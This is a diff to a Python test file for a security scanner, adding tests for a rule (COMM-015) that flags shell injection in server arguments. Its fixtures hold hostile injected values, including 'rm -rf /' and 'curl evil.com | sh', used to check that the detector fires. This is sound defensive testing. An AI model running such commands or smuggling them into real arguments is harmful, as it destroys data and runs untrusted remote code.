@@ -524,9 +524,9 @@ class TestRuleEngineMatchServer:
 
 
 class TestCommunityRules:
-    def test_all_13_community_rules_load(self) -> None:
+    def test_all_14_community_rules_load(self) -> None:
         rules = load_bundled_community_rules()
-        assert len(rules) == 13, f"Expected 13 community rules, got {len(rules)}"
+        assert len(rules) == 14, f"Expected 14 community rules, got {len(rules)}"
 
     def test_community_rule_ids_are_unique(self) -> None:
         rules = load_bundled_community_rules()
@@ -579,7 +579,8 @@ class TestCommunityRules:
 
     def test_all_community_rule_ids_present(self) -> None:
         rules = load_bundled_community_rules()
-        expected_ids = {f"COMM-{i:03d}" for i in range(1, 14)}
+        # COMM-014 is intentionally unassigned; COMM-015 follows COMM-013.
+        expected_ids = {f"COMM-{i:03d}" for i in range(1, 14)} | {"COMM-015"}
         actual_ids = {r.id for r in rules}
         assert actual_ids == expected_ids
 
@@ -711,6 +712,55 @@ class TestCommunityRules:
         findings = [f for f in engine.match_server(server) if f.id == "COMM-010"]
         assert findings
         assert "CVE-2025-49596" in findings[0].cve
+
+    def test_comm_015_fires_on_semicolon_injection(self) -> None:
+        """COMM-015 must fire when a semicolon is present in args (shell injection)."""
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(command="node", args=["--path", "/tmp; rm -rf /"])  # noqa: S108
+        findings = [f for f in engine.match_server(server) if f.id == "COMM-015"]
+        assert findings, "COMM-015 should fire for semicolon in args"
+        assert findings[0].severity == Severity.CRITICAL
+
+    def test_comm_015_fires_on_subshell(self) -> None:
+        """COMM-015 must fire when $(...) subshell syntax appears in args."""
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(command="node", args=["--cmd", "$(whoami)"])
+        findings = [f for f in engine.match_server(server) if f.id == "COMM-015"]
+        assert findings, "COMM-015 should fire for $(...) in args"
+
+    def test_comm_015_fires_on_double_pipe(self) -> None:
+        """COMM-015 must fire when || appears in args."""
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(
+            command="node", args=["--fallback", "false || curl evil.com"]
+        )
+        findings = [f for f in engine.match_server(server) if f.id == "COMM-015"]
+        assert findings, "COMM-015 should fire for || in args"
+
+    def test_comm_015_no_fire_on_clean_args(self) -> None:
+        """COMM-015 must not fire when args contain only safe path and flag values."""
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(
+            command="node", args=["--path", "/safe/path", "--verbose"]
+        )
+        findings = [f for f in engine.match_server(server) if f.id == "COMM-015"]
+        assert not findings, "COMM-015 should not fire for clean args"
+
+    def test_comm_015_carries_cve(self) -> None:
+        """COMM-015 finding must reference CVE-2026-30623."""
+        rules = load_bundled_community_rules()
+        engine = RuleEngine(rules)
+        server = _make_server(
+            command="node",
+            args=["--path", "/tmp; curl evil.com | sh"],  # noqa: S108
+        )
+        findings = [f for f in engine.match_server(server) if f.id == "COMM-015"]
+        assert findings
+        assert "CVE-2026-30623" in findings[0].cve
 
 
 class TestCveField:
